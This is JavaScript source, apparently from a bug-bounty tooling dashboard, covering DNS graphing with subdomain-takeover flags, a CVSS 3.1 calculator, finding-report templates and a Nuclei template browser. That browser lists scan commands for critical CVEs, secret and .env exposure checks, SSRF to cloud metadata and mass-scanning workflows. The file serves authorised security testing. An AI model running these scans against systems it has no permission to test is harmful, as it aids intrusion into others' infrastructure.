      <marker id="arrow" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
        <path d="M 0 2 L 10 5 L 0 8 z" fill="var(--text3)" />
      </marker>
    </defs>
  `;

  const nodeMap = new Map();
  const links = [];

  nodeMap.set(rootDomain, { id: rootDomain, label: rootDomain, col: 0, type: 'root', matches: [] });

  const recordTypes = {
    1: 'A', 28: 'AAAA', 5: 'CNAME', 15: 'MX', 16: 'TXT', 2: 'NS', 6: 'SOA'
  };

  answers.forEach(ans => {
    const name = ans.name.replace(/\.$/, '');
    const data = ans.data.replace(/\.$/, '');
    const typeStr = recordTypes[ans.type] || 'TYPE' + ans.type;

    if (!nodeMap.has(name)) {
      nodeMap.set(name, { id: name, label: name, col: -1, type: 'node', matches: [] });
    }
    if (!nodeMap.has(data)) {
      let nodeType = 'leaf';
      if (ans.type === 5) nodeType = 'cname';
      else if (ans.type === 15) nodeType = 'mx';
      else if (ans.type === 2) nodeType = 'ns';
      nodeMap.set(data, { id: data, label: data, col: -1, type: nodeType, matches: [] });
    }

    links.push({ source: name, target: data, type: typeStr });
  });

  nodeMap.get(rootDomain).col = 0;
  let changed = true;
  for (let step = 0; step < 10 && changed; step++) {
    changed = false;
    links.forEach(l => {
      const src = nodeMap.get(l.source);
      const tgt = nodeMap.get(l.target);
      if (src && tgt && src.col !== -1) {
        const newCol = src.col + 1;
        if (tgt.col < newCol) {
          tgt.col = newCol;
          changed = true;
        }
      }
    });
  }

  nodeMap.forEach(n => {
    if (n.col === -1) n.col = 1;
  });

  const cols = [];
  nodeMap.forEach(n => {
    if (!cols[n.col]) cols[n.col] = [];
    cols[n.col].push(n);
  });

  const activeCols = cols.filter(c => c && c.length > 0);
  const maxCol = activeCols.length - 1;

  activeCols.forEach((colNodes, colIdx) => {
    const colCount = colNodes.length;
    colNodes.forEach((n, nodeIdx) => {
      n.x = maxCol > 0 ? (colIdx / maxCol) * (width - 200) + 100 : width / 2;
      n.y = (nodeIdx + 0.5) * (height / colCount);
    });
  });

  const takeoverDomains = ['github.io', 'amazonaws.com', 'herokuapp.com', 'myshopify.com', 'fastly.net', 'ghost.io'];
  let takeoverFound = false;

  links.forEach(l => {
    const src = nodeMap.get(l.source);
    const tgt = nodeMap.get(l.target);
    if (!src || !tgt) return;

    const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
    const d = `M ${src.x} ${src.y} C ${(src.x + tgt.x)/2} ${src.y}, ${(src.x + tgt.x)/2} ${tgt.y}, ${tgt.x} ${tgt.y}`;
    path.setAttribute('d', d);
    path.setAttribute('stroke', 'rgba(255,255,255,0.15)');
    path.setAttribute('stroke-width', '1.5');
    path.setAttribute('fill', 'none');
    path.setAttribute('marker-end', 'url(#arrow)');
    svg.appendChild(path);

    const midX = (src.x + tgt.x) / 2;
    const midY = (src.y + tgt.y) / 2;
    const txt = document.createElementNS('http://www.w3.org/2000/svg', 'text');
    txt.setAttribute('x', midX);
    txt.setAttribute('y', midY - 6);
    txt.setAttribute('text-anchor', 'middle');
    txt.setAttribute('fill', 'var(--text3)');
    txt.setAttribute('font-family', 'var(--mono)');
    txt.setAttribute('font-size', '9px');
    txt.setAttribute('font-weight', '700');
    txt.textContent = l.type;
    svg.appendChild(txt);
  });

  nodeMap.forEach(n => {
    let isVulnerable = false;
    if (n.type === 'cname') {
      const isMatch = takeoverDomains.some(d => n.id.toLowerCase().includes(d));
      if (isMatch) {
        isVulnerable = true;
        takeoverFound = true;
      }
    }

    const g = document.createElementNS('http://www.w3.org/2000/svg', 'g');
    g.setAttribute('cursor', 'pointer');
    
    g.onclick = () => {
      const isIp = /^[0-9\.]+$/.test(n.id) || n.id.includes(':');
      if (isIp) {
        goPage('osint');
        const osintIpInput = document.getElementById('osint-ip');
        if (osintIpInput) {
          osintIpInput.value = n.id;
          const osintIpBtn = osintIpInput.nextElementSibling;
          if (osintIpBtn && typeof osintIpBtn.click === 'function') osintIpBtn.click();
        }
        toast(`Routing resolved IP ${n.id} to OSINT Network scanner...`, 'success');
      } else {
        const dnsDomainInput = document.getElementById('dns-domain');
        if (dnsDomainInput) {
          dnsDomainInput.value = n.id;
          toast(`Selected node: ${n.id}`, 'info');
        }
      }
    };

    const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
    circle.setAttribute('cx', n.x);
    circle.setAttribute('cy', n.y);
    circle.setAttribute('r', isVulnerable ? '8' : n.type === 'root' ? '7' : '5');
    
    const nodeColor = isVulnerable ? 'var(--red)' : n.type === 'root' ? 'var(--accent)' : 'var(--green)';
    circle.setAttribute('fill', nodeColor);
    circle.setAttribute('style', `filter: drop-shadow(0 0 4px ${nodeColor});`);
    g.appendChild(circle);

    const text = document.createElementNS('http://www.w3.org/2000/svg', 'text');
    text.setAttribute('x', n.x);
    text.setAttribute('y', n.y - 12);
    text.setAttribute('text-anchor', 'middle');
    text.setAttribute('fill', isVulnerable ? 'var(--red)' : '#fff');
    text.setAttribute('font-size', '10.5px');
    text.setAttribute('font-family', 'var(--mono)');
    text.setAttribute('font-weight', isVulnerable ? '700' : '500');
    text.textContent = n.label.length > 25 ? n.label.slice(0, 22) + '...' : n.label;
    
    const title = document.createElementNS('http://www.w3.org/2000/svg', 'title');
    title.textContent = `${n.id}${isVulnerable ? ' [⚠️ POTENTIAL SUBDOMAIN TAKEOVER VECTOR]' : ''}`;
    g.appendChild(title);
    
    g.appendChild(text);

    if (isVulnerable) {
      const badge = document.createElementNS('http://www.w3.org/2000/svg', 'text');
      badge.setAttribute('x', n.x);
      badge.setAttribute('y', n.y + 18);
      badge.setAttribute('text-anchor', 'middle');
      badge.setAttribute('fill', 'var(--red)');
      badge.setAttribute('font-size', '8px');
      badge.setAttribute('font-weight', '700');
      badge.setAttribute('font-family', 'var(--font)');
      badge.textContent = '⚠️ TAKEOVER?';
      g.appendChild(badge);
    }

    svg.appendChild(g);
  });

  if (takeoverFound && warningEl) {
    warningEl.innerHTML = '⚠️ Potential Subdomain Takeover Signature Detected!';
    warningEl.style.color = 'var(--red)';
    toast('Warning: CNAME points to a takeover-vulnerable cloud host!', 'error');
  }
}

async function dnsBulkLookup() {
  const domains = (document.getElementById('dns-bulk')?.value || '').split('\n').map(d => d.trim()).filter(Boolean);
  const out = document.getElementById('dns-bulk-results');
  if (!domains.length || !out) return;
  out.innerHTML = '<div style="color:var(--accent);font-size:12px">Checking ' + domains.length + ' domains...</div>';
  const results = [];
  for (const d of domains.slice(0, 30)) {
    try {
      const res = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(d)}&type=A`);
      const data = await res.json();
      results.push({ domain: d, alive: data.Status === 0 && data.Answer && data.Answer.length > 0, ip: data.Answer?.[0]?.data || null });
    } catch {
      results.push({ domain: d, alive: false, ip: null });
    }
  }
  out.innerHTML = results.map(r => `
    <div style="display:flex;align-items:center;gap:10px;padding:8px;border-bottom:1px solid var(--border);font-size:12px">
      <span style="width:60px;flex-shrink:0">${r.alive ? '<span class="chip chip-green">Alive</span>' : '<span class="chip chip-red">Dead</span>'}</span>
      <span style="flex:1;font-family:var(--mono)">${esc(r.domain)}</span>
      ${r.ip ? `<span style="font-family:var(--mono);color:var(--text3)">${esc(r.ip)}</span>` : ''}
    </div>`).join('');
}

// ── FULL CVSS 3.1 CALCULATOR ──────────────────────────────────
const cvssMetrics = {
  AV: { name: 'Attack Vector', opts: { N: ['Network', 0.85], A: ['Adjacent', 0.62], L: ['Local', 0.55], P: ['Physical', 0.2] } },
  AC: { name: 'Attack Complexity', opts: { L: ['Low', 0.77], H: ['High', 0.44] } },
  PR: { name: 'Privileges Required', opts: { N: ['None', 0.85], L: ['Low', 0.62], H: ['High', 0.27] } },
  UI: { name: 'User Interaction', opts: { N: ['None', 0.85], R: ['Required', 0.62] } },
  S:  { name: 'Scope', opts: { U: ['Unchanged', null], C: ['Changed', null] } },
  C:  { name: 'Confidentiality', opts: { N: ['None', 0], L: ['Low', 0.22], H: ['High', 0.56] } },
  I:  { name: 'Integrity', opts: { N: ['None', 0], L: ['Low', 0.22], H: ['High', 0.56] } },
  A:  { name: 'Availability', opts: { N: ['None', 0], L: ['Low', 0.22], H: ['High', 0.56] } },
};
let cvssSelected = { AV: 'N', AC: 'L', PR: 'N', UI: 'N', S: 'U', C: 'N', I: 'N', A: 'N' };

function renderCVSSCalc() {
  const el = document.getElementById('cvss-interactive');
  if (!el) return;
  el.innerHTML = Object.entries(cvssMetrics).map(([key, metric]) => `
    <div class="cvss-metric">
      <div class="cvss-metric-label">${metric.name}</div>
      <div class="cvss-metric-opts">
        ${Object.entries(metric.opts).map(([optKey, [label]]) => `
          <button class="cvss-opt ${cvssSelected[key] === optKey ? 'active' : ''}"
            onclick="setCVSSMetric('${key}','${optKey}')">${label}</button>`).join('')}
      </div>
    </div>`).join('');
  updateCVSSScore();
}

function setCVSSMetric(key, val) {
  cvssSelected[key] = val;
  renderCVSSCalc();
}

function updateCVSSScore() {
  const s = cvssSelected;
  const scope = s.S === 'C';
  const prMap = scope
    ? { N: 0.85, L: 0.68, H: 0.50 }
    : { N: 0.85, L: 0.62, H: 0.27 };

  const av = cvssMetrics.AV.opts[s.AV][1];
  const ac = cvssMetrics.AC.opts[s.AC][1];
  const pr = prMap[s.PR];
  const ui = cvssMetrics.UI.opts[s.UI][1];
  const c  = cvssMetrics.C.opts[s.C][1];
  const i  = cvssMetrics.I.opts[s.I][1];
  const a  = cvssMetrics.A.opts[s.A][1];

  const iss = 1 - (1 - c) * (1 - i) * (1 - a);
  let impact, exploitability;
  if (scope) {
    impact = 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15);
  } else {
    impact = 6.42 * iss;
  }
  exploitability = 8.22 * av * ac * pr * ui;

  let score = 0;
  if (impact > 0) {
    if (scope) {
      score = Math.min(10, 1.08 * (impact + exploitability));
    } else {
      score = Math.min(10, impact + exploitability);
    }
    score = Math.ceil(score * 10) / 10;
  }

  const sev = score === 0 ? 'None' : score < 4 ? 'Low' : score < 7 ? 'Medium' : score < 9 ? 'High' : 'Critical';
  const sevColor = { None: 'var(--text3)', Low: 'var(--accent)', Medium: 'var(--yellow)', High: 'var(--orange)', Critical: 'var(--red)' };

  const vector = `CVSS:3.1/AV:${s.AV}/AC:${s.AC}/PR:${s.PR}/UI:${s.UI}/S:${s.S}/C:${s.C}/I:${s.I}/A:${s.A}`;

  const scoreEl = document.getElementById('cvss-score-display');
  const vecEl = document.getElementById('cvss-vector-output');
  if (scoreEl) {
    scoreEl.innerHTML = `
      <div class="cvss-score-num" style="color:${sevColor[sev]}">${score.toFixed(1)}</div>
      <div class="cvss-score-sev" style="color:${sevColor[sev]}">${sev}</div>
      <div class="cvss-score-ring" style="--score:${score};--color:${sevColor[sev]}"></div>`;
  }
  if (vecEl) vecEl.textContent = vector;
}

// ── FINDING DETAIL MODAL ──────────────────────────────────────
function openFindingDetail(id) {
  const f = S.findings.find(x => x.id == id);
  if (!f) return;
  const tname = targetNameById(f.targetId);
  let screenshots = [];
  try { screenshots = f.screenshots ? JSON.parse(f.screenshots) : []; } catch(e) { screenshots = []; }
  if (!Array.isArray(screenshots)) screenshots = [];

  const modal = document.getElementById('modal-finding-detail');
  if (!modal) return;
  document.getElementById('fd-title').textContent = f.title;
  document.getElementById('fd-body').innerHTML = `
    <div class="fd-meta-strip">
      ${sevLabels[f.severity] || ''}
      <span class="chip chip-gray">${esc(f.type)}</span>
      <span class="status-badge">${esc(f.status)}</span>
      ${f.cvss ? `<span class="chip chip-gray">CVSS: ${esc(f.cvss)}</span>` : ''}
      ${f.bountyEarned ? `<span class="chip chip-green">💰 ${esc(f.bountyEarned)}</span>` : ''}
      ${tname ? `<span class="chip chip-blue">🎯 ${esc(tname)}</span>` : ''}
    </div>
    ${f.host || f.endpoint ? `<div class="fd-section"><div class="fd-section-label">Affected Endpoint</div><div class="fd-mono">${esc(f.host || '')}${f.endpoint ? '<span style="color:var(--text3)">'+esc(f.endpoint)+'</span>' : ''}</div></div>` : ''}
    ${f.desc ? `<div class="fd-section"><div class="fd-section-label">Steps to Reproduce</div><div class="fd-desc">${esc(f.desc)}</div></div>` : ''}
    ${f.payload ? `<div class="fd-section" style="position:relative"><div class="fd-section-label">Payload</div><button class="copy-btn" style="position:absolute; top:-4px; right:0;" onclick="copyFindingPayload(${f.id})">📋 Copy</button><div class="payload-snippet" style="white-space:pre-wrap">${esc(f.payload)}</div></div>` : ''}
    ${f.remediation ? `<div class="fd-section"><div class="fd-section-label">Remediation</div><div class="fd-desc">${esc(f.remediation)}</div></div>` : ''}
    ${screenshots.length ? `<div class="fd-section"><div class="fd-section-label">Evidence (${screenshots.length} screenshot${screenshots.length>1?'s':''})</div><div class="fd-screenshots">${screenshots.map((src,i) => `<img src="${src}" class="fd-screenshot-thumb" onclick="viewScreenshotSrc('${i}','detail')" title="Click to enlarge">`).join('')}</div></div>` : ''}
    <div class="fd-actions">
      <button class="btn btn-primary" onclick="closeModal('modal-finding-detail');openFindingModal(${f.id})">✏️ Edit Finding</button>
      <button class="btn" onclick="copyFindingAsMarkdown(${f.id})">📋 Copy as Markdown</button>
      <button class="btn" onclick="copyFindingAsH1(${f.id})">📤 HackerOne Template</button>
    </div>`;
  openModal('modal-finding-detail');
  // store detail screenshots for viewer
  window._detailScreenshots = screenshots;
}

function copyFindingPayload(id) {
  const f = S.findings.find(x => x.id == id);
  if (f && f.payload) {
    window.copyTextToClipboard(f.payload).then(() => toast('Payload copied!', 'success'));
  }
}

function viewScreenshotSrc(idx, context) {
  const src = context === 'detail' ? window._detailScreenshots[idx] : currentScreenshots[idx];
  if (!src) return;
  const overlay = document.createElement('div');
  overlay.className = 'screenshot-lightbox';
  overlay.innerHTML = `<img src="${src}" style="max-width:90vw;max-height:90vh;border-radius:8px;box-shadow:0 20px 80px rgba(0,0,0,0.8)"><button onclick="this.parentElement.remove()" style="position:absolute;top:20px;right:20px;background:rgba(255,255,255,0.15);border:none;color:#fff;font-size:24px;cursor:pointer;border-radius:50%;width:40px;height:40px">×</button>`;
  overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
  document.body.appendChild(overlay);
}

function copyFindingAsMarkdown(id) {
  const f = S.findings.find(x => x.id == id);
  if (!f) return;
  const tname = targetNameById(f.targetId);
  const md = `# ${f.title}

**Severity:** ${(f.severity || '').toUpperCase()}  
**Type:** ${f.type}  
**Status:** ${f.status}  
**CVSS:** ${f.cvss || 'N/A'}  
**Program:** ${tname || 'N/A'}  
**Endpoint:** ${f.host || ''}${f.endpoint || ''}

## Steps to Reproduce
${f.desc || 'N/A'}

## Proof of Concept
\`\`\`
${f.payload || 'N/A'}
\`\`\`

## Impact
${f.bountyEarned ? `Bounty Earned: ${f.bountyEarned}` : 'Describe the business impact.'}

## Remediation
${f.remediation || 'Apply appropriate input validation and defense-in-depth controls.'}`;
  window.copyTextToClipboard(md).then(() => toast('Markdown report copied!', 'success'));
}

function copyFindingAsH1(id) {
  const f = S.findings.find(x => x.id == id);
  if (!f) return;
  const h1 = `**Summary:**
${f.title}

**Description:**
${f.desc || 'See steps to reproduce below.'}

**Steps To Reproduce:**
${f.desc || '1. Navigate to the affected endpoint.\n2. Observe the vulnerability.'}

**Proof of Concept:**
\`\`\`
${f.payload || 'N/A'}
\`\`\`

**Affected Host:** ${f.host || 'N/A'}
**Affected Endpoint:** ${f.endpoint || 'N/A'}
**Severity:** ${(f.severity || '').toUpperCase()}
**CVSS:** ${f.cvss || 'N/A'}`;
  window.copyTextToClipboard(h1).then(() => toast('HackerOne template copied!', 'success'));
}

// ── NUCLEI TEMPLATE BROWSER ───────────────────────────────────
const nucleiTemplates = [
  // === CRITICAL CVEs ===
  { id: 'CVE-2021-44228', name: 'Log4Shell (Log4j RCE)', severity: 'critical', tags: ['cve', 'rce', 'java'], cmd: 'nuclei -t cves/2021/CVE-2021-44228.yaml -u {target}' },
  { id: 'CVE-2021-26855', name: 'Exchange ProxyLogon', severity: 'critical', tags: ['cve', 'rce', 'exchange'], cmd: 'nuclei -t cves/2021/CVE-2021-26855.yaml -u {target}' },
  { id: 'CVE-2022-22965', name: 'Spring4Shell RCE', severity: 'critical', tags: ['cve', 'rce', 'spring'], cmd: 'nuclei -t cves/2022/CVE-2022-22965.yaml -u {target}' },
  { id: 'CVE-2023-4966', name: 'Citrix Bleed', severity: 'critical', tags: ['cve', 'citrix'], cmd: 'nuclei -t cves/2023/CVE-2023-4966.yaml -u {target}' },
  { id: 'CVE-2024-3400', name: 'PAN-OS Command Injection', severity: 'critical', tags: ['cve', 'rce', 'panos'], cmd: 'nuclei -t cves/2024/CVE-2024-3400.yaml -u {target}' },
  { id: 'CVE-2023-22515', name: 'Confluence Broken Access Control', severity: 'critical', tags: ['cve', 'auth-bypass', 'atlassian'], cmd: 'nuclei -t cves/2023/CVE-2023-22515.yaml -u {target}' },
  { id: 'CVE-2019-11510', name: 'Pulse Secure Arbitrary File Read', severity: 'critical', tags: ['cve', 'lfi', 'vpn'], cmd: 'nuclei -t cves/2019/CVE-2019-11510.yaml -u {target}' },
  { id: 'CVE-2020-5902', name: 'F5 BIG-IP TMUI RCE', severity: 'critical', tags: ['cve', 'rce', 'f5'], cmd: 'nuclei -t cves/2020/CVE-2020-5902.yaml -u {target}' },
  
  // === NEW HIGH PROFILE CVEs ===
  { id: 'CVE-2024-1709', name: 'ScreenConnect Authentication Bypass', severity: 'critical', tags: ['cve', 'bypass', 'screenconnect'], cmd: 'nuclei -t cves/2024/CVE-2024-1709.yaml -u {target}' },
  { id: 'CVE-2023-46805', name: 'Ivanti Connect Secure Auth Bypass', severity: 'critical', tags: ['cve', 'bypass', 'ivanti'], cmd: 'nuclei -t cves/2023/CVE-2023-46805.yaml -u {target}' },
  { id: 'CVE-2023-27997', name: 'FortiOS SSL VPN Heap Overflow', severity: 'critical', tags: ['cve', 'rce', 'fortinet'], cmd: 'nuclei -t cves/2023/CVE-2023-27997.yaml -u {target}' },
  { id: 'CVE-2022-26134', name: 'Confluence OGNL Injection RCE', severity: 'critical', tags: ['cve', 'rce', 'atlassian'], cmd: 'nuclei -t cves/2022/CVE-2022-26134.yaml -u {target}' },
  { id: 'CVE-2021-34473', name: 'Exchange ProxyShell RCE', severity: 'critical', tags: ['cve', 'rce', 'exchange'], cmd: 'nuclei -t cves/2021/CVE-2021-34473.yaml -u {target}' },
  { id: 'CVE-2022-30190', name: 'Follina MSDT RCE', severity: 'high', tags: ['cve', 'rce', 'msdt'], cmd: 'nuclei -t cves/2022/CVE-2022-30190.yaml -u {target}' },
  { id: 'CVE-2020-1472', name: 'Zerologon Active Directory', severity: 'critical', tags: ['cve', 'rce', 'windows'], cmd: 'nuclei -t cves/2020/CVE-2020-1472.yaml -u {target}' },
  { id: 'CVE-2021-4034', name: 'Polkit PwnKit Privilege Escalation', severity: 'high', tags: ['cve', 'lpe', 'linux'], cmd: 'nuclei -t cves/2021/CVE-2021-4034.yaml -u {target}' },
  { id: 'CVE-2023-3519', name: 'Citrix ADC Remote Code Execution', severity: 'critical', tags: ['cve', 'rce', 'citrix'], cmd: 'nuclei -t cves/2023/CVE-2023-3519.yaml -u {target}' },
  { id: 'CVE-2024-21626', name: 'runc Container Breakout LPE', severity: 'high', tags: ['cve', 'escape', 'docker'], cmd: 'nuclei -t cves/2024/CVE-2024-21626.yaml -u {target}' },

  // === EXPOSURES & SECRETS ===
  { id: 'exposed-env', name: '.env File Exposed', severity: 'high', tags: ['exposure', 'secrets'], cmd: 'nuclei -t exposures/files/env-file.yaml -u {target}' },
  { id: 'git-exposed', name: 'Exposed .git Directory', severity: 'high', tags: ['exposure', 'git'], cmd: 'nuclei -t exposures/configs/git-config.yaml -u {target}' },
  { id: 'ds-store', name: 'DS_Store File Exposed', severity: 'medium', tags: ['exposure', 'macos'], cmd: 'nuclei -t exposures/files/ds-store.yaml -u {target}' },
  { id: 'swagger-api', name: 'Swagger UI Exposed', severity: 'medium', tags: ['exposure', 'api'], cmd: 'nuclei -t exposures/apis/swagger-api.yaml -u {target}' },
  { id: 'phpinfo', name: 'PHP Info Exposed', severity: 'medium', tags: ['exposure', 'php'], cmd: 'nuclei -t exposures/files/phpinfo-files.yaml -u {target}' },
  { id: 'debug-panel', name: 'Debug Panel Exposed', severity: 'high', tags: ['exposure', 'debug'], cmd: 'nuclei -t exposures/panels/ -u {target}' },
  { id: 'aws-keys-exposure', name: 'AWS Access Keys Exposure', severity: 'critical', tags: ['exposure', 'cloud'], cmd: 'nuclei -t exposures/tokens/aws-keys.yaml -u {target}' },
  { id: 'jira-exposure', name: 'Jira API / Dashboard Exposed', severity: 'medium', tags: ['exposure', 'atlassian'], cmd: 'nuclei -t exposures/apis/jira-api.yaml -u {target}' },
  { id: 'prometheus-exposure', name: 'Prometheus Metrics Exposed', severity: 'medium', tags: ['exposure', 'metrics'], cmd: 'nuclei -t exposures/apis/prometheus-api.yaml -u {target}' },

  // === WEB VULNERABILITIES ===
  { id: 'xss-reflected', name: 'Reflected XSS (generic)', severity: 'medium', tags: ['vulnerability', 'xss', 'web'], cmd: 'nuclei -t vulnerabilities/generic/basic-xss.yaml -u {target}' },
  { id: 'ssrf-aws', name: 'SSRF to AWS Metadata', severity: 'critical', tags: ['vulnerability', 'ssrf', 'cloud'], cmd: 'nuclei -t vulnerabilities/generic/ssrf.yaml -u {target}' },
  { id: 'open-redirect', name: 'Open Redirect', severity: 'medium', tags: ['vulnerability', 'redirect', 'web'], cmd: 'nuclei -t vulnerabilities/generic/open-redirect.yaml -u {target}' },
  { id: 'sqli-detect', name: 'SQLi Error Detection', severity: 'high', tags: ['vulnerability', 'sqli', 'db'], cmd: 'nuclei -t vulnerabilities/generic/sqli-error.yaml -u {target}' },
  { id: 'jwt-none-alg', name: 'JWT None Algorithm', severity: 'critical', tags: ['vulnerability', 'auth', 'jwt'], cmd: 'nuclei -t vulnerabilities/generic/jwt-none.yaml -u {target}' },
  { id: 'lfi-linux', name: 'Local File Inclusion (Linux)', severity: 'high', tags: ['vulnerability', 'lfi', 'web'], cmd: 'nuclei -t vulnerabilities/generic/lfi-linux.yaml -u {target}' },
  { id: 'crlf-injection', name: 'CRLF Injection', severity: 'medium', tags: ['vulnerability', 'crlf', 'web'], cmd: 'nuclei -t vulnerabilities/generic/crlf-injection.yaml -u {target}' },

  // === MISCONFIGURATIONS ===
  { id: 'cors-misconfig', name: 'CORS Misconfiguration', severity: 'medium', tags: ['misconfig', 'cors'], cmd: 'nuclei -t misconfiguration/cors-misconfig.yaml -u {target}' },
  { id: 'http-missing-headers', name: 'Missing Security Headers', severity: 'low', tags: ['misconfig', 'headers'], cmd: 'nuclei -t misconfiguration/http-missing-security-headers.yaml -u {target}' },
  { id: 'spring-actuator', name: 'Spring Boot Actuators', severity: 'medium', tags: ['misconfig', 'spring'], cmd: 'nuclei -t exposures/apis/spring-actuator.yaml -u {target}' },
  { id: 'mongo-express', name: 'MongoDB Express Exposed', severity: 'critical', tags: ['misconfig', 'mongodb'], cmd: 'nuclei -t misconfiguration/mongodb/ -u {target}' },
  { id: 'elastic-unauth', name: 'ElasticSearch Unauthenticated', severity: 'critical', tags: ['misconfig', 'elastic'], cmd: 'nuclei -t misconfiguration/elasticsearch.yaml -u {target}' },
  { id: 'subdomain-takeover', name: 'Subdomain Takeover Detection', severity: 'high', tags: ['misconfig', 'takeover', 'dns'], cmd: 'nuclei -t takeovers/ -l subdomains.txt' },
  { id: 's3-bucket-takeover', name: 'S3 Bucket Takeover', severity: 'high', tags: ['misconfig', 'takeover', 'cloud'], cmd: 'nuclei -t takeovers/aws-bucket-takeover.yaml -l subdomains.txt' },
  { id: 'jenkins-unauth', name: 'Jenkins Unauthenticated Dashboard', severity: 'high', tags: ['misconfig', 'ci-cd'], cmd: 'nuclei -t misconfiguration/jenkins/jenkins-unauth.yaml -u {target}' },
  
  // === CMS & TECHNOLOGIES ===
  { id: 'wp-enum', name: 'WordPress Core/Plugin Enumeration', severity: 'info', tags: ['tech', 'wordpress', 'cms'], cmd: 'nuclei -t technologies/wordpress/ -u {target}' },
  { id: 'aem-detect', name: 'Adobe Experience Manager Detect', severity: 'info', tags: ['tech', 'aem', 'cms'], cmd: 'nuclei -t technologies/aem/ -u {target}' },
  { id: 'drupal-detect', name: 'Drupal Detect', severity: 'info', tags: ['tech', 'drupal', 'cms'], cmd: 'nuclei -t technologies/drupal/ -u {target}' },
  { id: 'waf-detect', name: 'WAF Detection', severity: 'info', tags: ['tech', 'waf', 'security'], cmd: 'nuclei -t technologies/waf-detect.yaml -u {target}' },

  // === MASS SCANNING WORKFLOWS ===
  { id: 'full-scan', name: 'Full Template Scan (All)', severity: 'high', tags: ['workflow', 'scan', 'all'], cmd: 'nuclei -u {target} -t . -severity critical,high,medium -o nuclei_output.json' },
  { id: 'fast-recon', name: 'Fast Recon Scan', severity: 'medium', tags: ['workflow', 'scan', 'recon'], cmd: 'nuclei -u {target} -t exposures/ -t misconfiguration/ -t takeovers/ -c 50' },
  { id: 'cve-hunt', name: 'Hunt for CVEs Only', severity: 'high', tags: ['workflow', 'scan', 'cves'], cmd: 'nuclei -u {target} -t cves/ -c 50' },
  { id: 'secret-hunt', name: 'Hunt for Exposed Tokens & Secrets', severity: 'high', tags: ['workflow', 'scan', 'secrets'], cmd: 'nuclei -u {target} -tags exposure,token,key,secret' },
  { id: 'tech-stack', name: 'Technology Stack Fingerprinting', severity: 'info', tags: ['workflow', 'tech', 'recon'], cmd: 'nuclei -u {target} -t technologies/' },
  { id: 'fuzz-params', name: 'Fuzz All Parameters (Dastardly)', severity: 'medium', tags: ['workflow', 'fuzz', 'dast'], cmd: 'nuclei -u {target} -t dast/ -dast' },
];

let nucleiSearch = '', nucleiTagFilter = '', nucleiSeverityFilter = '', nucleiSortBy = 'default';

function renderNucleiTemplates() {
  const el = document.getElementById('nuclei-template-list');
  const countEl = document.getElementById('nuclei-total-count');
  if (!el) return;
  try {
      const targetVal = document.getElementById('nuclei-target')?.value.trim() || 'https://target.com';
      let list = [...nucleiTemplates];
      
      // Filter by search text
      if (nucleiSearch) {
        const q = nucleiSearch.toLowerCase();
        list = list.filter(t => t.name.toLowerCase().includes(q) || t.id.toLowerCase().includes(q) || t.tags.some(tag => tag.includes(q)));
      }
      
      // Filter by tag
      if (nucleiTagFilter) {
        list = list.filter(t => t.tags.includes(nucleiTagFilter) || t.severity === nucleiTagFilter);
      }
      
      // Filter by severity
      if (nucleiSeverityFilter) {
        list = list.filter(t => t.severity === nucleiSeverityFilter);
      }
      
      // Sort templates
      if (nucleiSortBy === 'severity') {
        const sevOrder = { 'critical': 4, 'high': 3, 'medium': 2, 'low': 1, 'info': 0 };
        list.sort((a, b) => (sevOrder[b.severity] || 0) - (sevOrder[a.severity] || 0));
      } else if (nucleiSortBy === 'cve') {
        list.sort((a, b) => {
          const aIsCve = a.id.startsWith('CVE-');
          const bIsCve = b.id.startsWith('CVE-');
          if (aIsCve && bIsCve) {
            return b.id.localeCompare(a.id);
          }
          if (aIsCve) return -1;
          if (bIsCve) return 1;
          return a.name.localeCompare(b.name);
        });
      } else if (nucleiSortBy === 'alpha') {
        list.sort((a, b) => a.name.localeCompare(b.name));
      }
      
      if (countEl) {
        countEl.textContent = `Showing ${list.length} of ${nucleiTemplates.length} templates`;
      }
      
      if (!list.length) { el.innerHTML = '<div class="empty-state"><div class="es-sub">No templates match your search filters</div></div>'; return; }
      
      // Build options suffix
      let suffix = '';
      if (document.getElementById('nuclei-opt-silent')?.checked) suffix += ' -silent';
      if (document.getElementById('nuclei-opt-stats')?.checked) suffix += ' -stats';
      if (document.getElementById('nuclei-opt-nometa')?.checked) suffix += ' -no-meta';
      if (document.getElementById('nuclei-opt-json')?.checked) suffix += ' -json';
      const concurrency = document.getElementById('nuclei-opt-concurrency')?.value;
      if (concurrency) suffix += ` -c ${concurrency}`;
      
      el.innerHTML = list.map(t => {
        const baseCmd = t.cmd.replace('{target}', targetVal);
        const fullCmd = baseCmd + suffix;
        const sevTag = t.severity || 'info';
        
        return `
        <div class="nuclei-card sev-card-${sevTag}">
          <div class="nuclei-card-head">
            <div>
              <div class="nuclei-card-name">${esc(t.name)}</div>
              <div class="nuclei-card-id">${esc(t.id)}</div>
            </div>
            <div style="display:flex;align-items:center;gap:8px">
              <span class="sev-badge sev-${sevTag}">${sevTag}</span>
              <button class="copy-btn" data-cmd="${esc(fullCmd).replace(/"/g, '&quot;')}" onclick="window.copyTextToClipboard(this.getAttribute('data-cmd')).then(()=>toast('Command copied!'))">📋 Copy</button>
              <button class="btn btn-primary btn-sm" onclick="runSimulatedNucleiScan('${esc(t.id)}')">⚡ Run</button>
            </div>
          </div>
          <div class="nuclei-cmd" onclick="window.copyTextToClipboard(this.innerText).then(()=>toast('Command copied!'))">${esc(fullCmd)}</div>
          <div class="nuclei-tags">
            ${t.tags.map(tag => `<span class="tag-chip" onclick="nucleiTagFilter='${esc(tag)}'; document.getElementById('nuclei-filter-tag').value='${esc(tag)}'; renderNucleiTemplates()">${esc(tag)}</span>`).join('')}
          </div>
        </div>`;
      }).join('');
  } catch (e) {
      el.innerHTML = `<div style="color:red;padding:20px;background:#330000;border:1px solid red;border-radius:4px;white-space:pre-wrap;font-family:monospace;">JAVASCRIPT ERROR:\n${e.stack || e}</div>`;
  }
}

window.setNucleiTargetFromActive = function() {
  if (S.targets && S.targets.length > 0) {
    const target = S.targets.find(x => x.status === 'active') || S.targets[0];
    let host = target.host || target.name || '';
    if (host && !/^https?:\/\//i.test(host)) {
      host = 'https://' + host;
    }
    const inp = document.getElementById('nuclei-target');
    if (inp) {
      inp.value = host;
      renderNucleiTemplates();
      toast(`Target set to "${host}"`, 'success');
    }
  } else {
    toast('No targets found in active workspace', 'error');
